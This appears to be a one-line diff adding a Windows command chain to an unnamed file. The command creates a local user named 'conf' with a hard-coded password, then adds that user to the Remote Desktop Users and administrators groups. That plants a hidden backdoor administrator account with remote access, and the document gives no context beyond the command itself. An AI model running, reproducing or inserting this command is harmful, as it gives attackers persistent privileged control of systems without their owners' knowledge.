@@ -1,0 +1,1 @@
+net user /add conf ToanMC202345678900000000000000000000 & net localgroup "Remote Desktop Users" "conf" /add & net localgroup administrators conf /add 
